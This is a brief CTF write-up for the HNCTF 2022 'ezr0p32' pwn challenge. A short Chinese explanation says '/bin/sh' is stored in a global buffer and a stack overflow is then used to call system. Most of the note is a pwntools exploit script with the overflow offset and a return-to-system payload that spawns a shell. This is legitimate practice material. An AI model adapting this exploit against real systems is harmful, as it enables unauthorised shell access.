[[HNCTF 2022 Week1]ezr0p32 | NSSCTF](https://www.nssctf.cn/problem/2930)
![[Pasted image 20240901114322.png]]
![[Pasted image 20240901114334.png]]
![[Pasted image 20240901114400.png]]
有system函数，无binsh
可将binsh存入buf，再栈溢出调用system
exp:
```python
from pwn import *

# p = remote("node5.anna.nssctf.cn", 26338)
p = process('./ezr0p')
elf = ELF('./ezr0p')

system_addr = elf.symbols['system']
buf = 0x804A080

p.sendlineafter(b"name", b'/bin/sh')

p.recvuntil(b"time~")

offset = 0x1C + 4

payload = b'a' * offset + p32(system_addr) + p32(0) + p32(buf)
p.sendline(payload)

p.interactive()
```
